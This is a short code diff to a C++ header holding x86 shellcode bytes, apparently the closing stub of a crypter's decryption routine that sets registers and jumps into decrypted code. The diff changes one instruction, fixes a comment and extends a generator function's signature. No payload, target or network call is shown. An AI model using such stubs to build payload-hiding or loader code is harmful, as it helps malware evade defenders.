@@ -21,12 +21,12 @@ namespace shellcode {
         };
 
         inline unsigned char crypt_end[]{
-            0x8D, 0x86, 0x00, 0x00, 0x00, 0x00,             // lea eax, [esi+0x00000000]     (+2)  // jump address
+            0x01, 0xF0,                                     // add eax, esi
             0x8B, 0xC8,                                     // mov ecx, eax
             0x8B, 0xD0,                                     // mov edx, eax
             0x8B, 0xF0,                                     // mov esi, eax
             0x8B, 0xF8,                                     // mov edi, eax
-            0x31, 0xDB,                                     // mov ebx, ebx
+            0x31, 0xDB,                                     // xor ebx, ebx
             0xFF, 0xE0,                                     // jmp
         };
 
@@ -35,5 +35,5 @@ namespace shellcode {
         };
     }
 
-    int generate(int eax, char* out);
+    int generate(int eax, char* out, int c = 0, bool j = false);
 }
